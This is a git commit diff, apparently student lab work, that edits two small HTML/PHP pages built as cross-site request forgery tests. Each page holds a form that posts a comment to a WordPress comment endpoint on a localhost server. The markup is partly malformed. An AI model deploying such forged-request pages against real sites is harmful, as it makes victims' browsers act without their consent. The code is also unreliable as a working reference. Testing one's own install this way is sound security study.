371bfd6c82eeb157de21a46768167ca2f4ffeed8
1400205 <1400205@rgu.ac.uk>
2016-07-07 14:47:30 +0100

    XSRF

--- XSRF.php
+++ XSRF.php
@@ -1,8 +1,8 @@
 <html>
-
+<p>TEST XSRF</p>
 <body>
 <form name="XSRF" action="http://localhost:85/frameworks/wordpress/wp-comments-post.php" method="post">
-    <input type="hidden" name="comment" Value="XSRF ATTACK ONE">
+    <textarea name="comment" Value="XSRF ATTACK ONE">
 
 </form>
 <input name="submit" type="submit" id="submit" class="submit" value="Post Comment" />
--- xsrf_attacker.php
+++ xsrf_attacker.php
@@ -10,7 +10,7 @@
 <h1> XSRF ATTACK</h1>
 <body>
 <form name="CSRF" action =action="http://localhost:85/frameworks/wordpress/wp-comments-post.php" method="post">
-    <input type="hidden" name="comment" Value="XSRF ATTACK ONE">
+    <textarea name="comment" Value="XSRF ATTACK ONE">
 
 </form>
 <input name="submit" type="submit" id="submit" class="submit" value="Post Comment" />
